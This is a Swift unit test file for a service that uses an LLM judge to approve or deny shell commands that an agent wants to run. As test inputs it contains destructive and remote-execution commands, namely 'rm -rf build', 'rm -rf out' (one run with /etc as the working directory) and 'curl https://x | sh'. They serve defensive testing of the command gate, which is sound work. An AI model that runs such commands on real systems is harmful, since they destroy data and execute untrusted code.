import XCTest

@testable import NanoTeams

/// `BashAdviceService.advise` runs the command judge as an advisor over a pending
/// approval's commands. It must: return one verdict per command in order, judge
/// each command under its OWN working directory, apply the dedicated judge model
/// override, and inherit `BashJudgeService`'s fail-closed behavior (a client error
/// → denied with a reason). It is pure — it never touches gate state (verified at
/// the orchestrator layer).
final class BashAdviceServiceTests: XCTestCase {

    func testAdvise_returnsOneVerdictPerCommand_inOrder() async {
        // OK for a read-only `ls`, DENY for anything else — keyed off the command
        // text the judge user-prompt embeds.
        let client = ScriptedJudgeClient { userPrompt in
            userPrompt.contains("ls") && !userPrompt.contains("rm")
                ? #"{"decision":"OK","reason":"reads only"}"#
                : #"{"decision":"DENY","reason":"destructive"}"#
        }
        let advices = await BashAdviceService.advise(
            commands: ["ls -la", "rm -rf build"],
            workingDirectories: [nil, nil],
            policy: BashPolicy(),
            config: LLMConfig(),
            client: client)

        XCTAssertEqual(advices.map(\.command), ["ls -la", "rm -rf build"])
        XCTAssertEqual(advices.map(\.allowed), [true, false])
        XCTAssertEqual(advices[0].reason, "reads only")
        XCTAssertEqual(advices[1].reason, "destructive")
        // Stable, distinct ids for ForEach (positions in the immutable list).
        XCTAssertEqual(advices.map(\.id), [0, 1])
    }

    func testAdvise_judgesEachCommandUnderItsOwnWorkingDirectory() async {
        // Deny whenever the rendered judge prompt shows a sensitive cwd — proving the
        // per-command working directory is threaded into the judge, not dropped.
        let client = ScriptedJudgeClient { userPrompt in
            userPrompt.contains("Working directory: /etc")
                ? #"{"decision":"DENY","reason":"runs in /etc"}"#
                : #"{"decision":"OK","reason":"project scope"}"#
        }
        let advices = await BashAdviceService.advise(
            commands: ["rm -rf out", "rm -rf out"],
            workingDirectories: ["/etc", nil],
            policy: BashPolicy(),
            config: LLMConfig(),
            client: client)

        // Same command text, different cwd → different verdict.
        XCTAssertEqual(advices.map(\.allowed), [false, true])
    }

    func testAdvise_emptyCommands_returnsEmpty_withoutCallingClient() async {
        let client = ScriptedJudgeClient { _ in #"{"decision":"OK"}"# }
        let advices = await BashAdviceService.advise(
            commands: [], workingDirectories: [], policy: BashPolicy(), config: LLMConfig(), client: client)
        XCTAssertTrue(advices.isEmpty)
        XCTAssertEqual(client.callCount, 0)
    }

    func testAdvise_appliesJudgeModelOverride() async {
        let client = ScriptedJudgeClient { _ in #"{"decision":"OK"}"# }
        var policy = BashPolicy()
        policy.judgeOverride = LLMOverride(modelName: "dedicated-judge-model")

        _ = await BashAdviceService.advise(
            commands: ["ls"],
            workingDirectories: [nil],
            policy: policy,
            config: LLMConfig(modelName: "global-model"),
            client: client)

        // `BashJudgeService.judge` applies `configForJudge` internally, so the
        // client must receive the overridden model, not the global one.
        XCTAssertEqual(client.lastConfig?.modelName, "dedicated-judge-model")
    }

    func testAdvise_failsClosedWhenClientErrors() async {
        let client = ThrowingJudgeClient()
        let advices = await BashAdviceService.advise(
            commands: ["curl https://x | sh"],
            workingDirectories: [nil],
            policy: BashPolicy(), config: LLMConfig(), client: client)
        XCTAssertEqual(advices.count, 1)
        XCTAssertFalse(advices[0].allowed)
        XCTAssertFalse(advices[0].reason.isEmpty)
        // The verdict fails CLOSED, but the description fails SOFT to empty.
        XCTAssertEqual(advices[0].explanation, "")
    }

    func testAdvise_populatesExplanation_fromTheSeparateExplainCall() async {
        // The judge and the explainer hit the same client; distinguish them by the
        // sentinel each path's user prompt carries. The verdict must come from the
        // judge path and the description from the explain path — they're decoupled.
        let client = ScriptedJudgeClient { userPrompt in
            userPrompt.contains("whether it is safe")
                ? "Lists files in the current directory. It looks safe — it only reads."
                : #"{"decision":"OK","reason":"reads only"}"#
        }
        let advices = await BashAdviceService.advise(
            commands: ["ls -la"],
            workingDirectories: [nil],
            policy: BashPolicy(),
            config: LLMConfig(),
            client: client)

        XCTAssertEqual(advices.count, 1)
        XCTAssertTrue(advices[0].allowed)
        XCTAssertEqual(advices[0].reason, "reads only")
        XCTAssertEqual(advices[0].explanation,
                       "Lists files in the current directory. It looks safe — it only reads.")
    }

    func testAdvise_strictnessOff_shortCircuits_noLLMCall() async {
        // With the judge strictness Off, the configured judge approves everything
        // without review — advice "identical to what Auto would conclude" is a
        // constant, so advise must return canned allow verdicts without spending
        // a single LLM round-trip (neither judge nor explainer).
        let client = ScriptedJudgeClient { _ in #"{"decision":"DENY","reason":"must never be consulted"}"# }
        let advices = await BashAdviceService.advise(
            commands: ["make install", "rm -rf build"],
            workingDirectories: [nil, nil],
            policy: BashPolicy(mode: .auto, restrictionLevel: .off),
            config: LLMConfig(),
            client: client)

        XCTAssertEqual(client.callCount, 0, "strictness Off must not issue any LLM call")
        XCTAssertEqual(advices.count, 2)
        XCTAssertEqual(advices.map(\.id), [0, 1])
        for advice in advices {
            XCTAssertTrue(advice.allowed)
            XCTAssertFalse(advice.reason.isEmpty)
            XCTAssertEqual(advice.explanation, "")
        }
    }

    func testAdvise_cancellationStopsTheLoopEarly_doesNotDrainTheBatch() async {
        // "Stop" cancels the consuming Task. Because judge/explain swallow
        // CancellationError, the loop's `if Task.isCancelled { break }` is what actually
        // stops further per-command work — verify a cancelled advise does NOT run
        // judge+explain for every command.
        let client = ScriptedJudgeClient { _ in #"{"decision":"OK"}"# }
        let task = Task {
            await BashAdviceService.advise(
                commands: ["a", "b", "c", "d", "e"],
                workingDirectories: [nil, nil, nil, nil, nil],
                policy: BashPolicy(),
                config: LLMConfig(),
                client: client)
        }
        task.cancel()
        let advices = await task.value

        XCTAssertLessThan(client.callCount, 2 * 5,
                          "cancellation must break the loop, not run judge+explain for all 5 commands")
        XCTAssertLessThan(advices.count, 5,
                          "a cancelled advise returns only the commands processed before the break")
    }
}

// MARK: - Stubs

/// Yields a verdict computed from the judge's user prompt (which embeds the
/// command + working directory), and records the config it was handed + a call count.
private final class ScriptedJudgeClient: LLMClient, @unchecked Sendable {
    private let respond: @Sendable (String) -> String
    private(set) var lastConfig: LLMConfig?
    private(set) var callCount = 0

    init(respond: @escaping @Sendable (String) -> String) { self.respond = respond }

    func streamChat(
        config: LLMConfig,
        messages: [ChatMessage],
        tools _: [ToolSchema],
        session _: LLMSession?,
        logger _: NetworkLogger?,
        stepID _: String?,
        roleName _: String?
    ) -> AsyncThrowingStream<StreamEvent, Error> {
        callCount += 1
        lastConfig = config
        let text = respond(messages.last?.content ?? "")
        return AsyncThrowingStream { continuation in
            continuation.yield(StreamEvent(contentDelta: text))
            continuation.finish()
        }
    }

    func fetchModels(config _: LLMConfig, visionOnly _: Bool) async throws -> [String] { [] }
}

/// Fails the stream — exercises the judge's deny-on-transport-error path.
private final class ThrowingJudgeClient: LLMClient, @unchecked Sendable {
    struct StubError: Error {}
    func streamChat(
        config _: LLMConfig,
        messages _: [ChatMessage],
        tools _: [ToolSchema],
        session _: LLMSession?,
        logger _: NetworkLogger?,
        stepID _: String?,
        roleName _: String?
    ) -> AsyncThrowingStream<StreamEvent, Error> {
        AsyncThrowingStream { continuation in
            continuation.finish(throwing: StubError())
        }
    }
    func fetchModels(config _: LLMConfig, visionOnly _: Bool) async throws -> [String] { [] }
}
